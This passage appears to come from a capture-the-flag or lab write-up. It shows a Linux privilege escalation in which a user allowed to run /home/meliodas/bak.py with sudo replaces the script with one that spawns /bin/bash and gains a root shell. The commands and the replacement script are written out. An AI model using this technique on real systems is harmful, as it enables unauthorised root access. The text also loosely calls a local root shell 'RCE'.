
If we have write access in the directory, in which the script is stored, we can just delete or move the script and replace it with an malicious one.

```
meliodas@ubuntu:/var/backups$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

Replace it with this one.

```
#/usr/bin/python

import os

os.system("/bin/bash")
```

Executed the script with sudo permissions.

```
sudo /usr/bin/python /home/meliodas/bak.py
```

Gained RCE as user root.

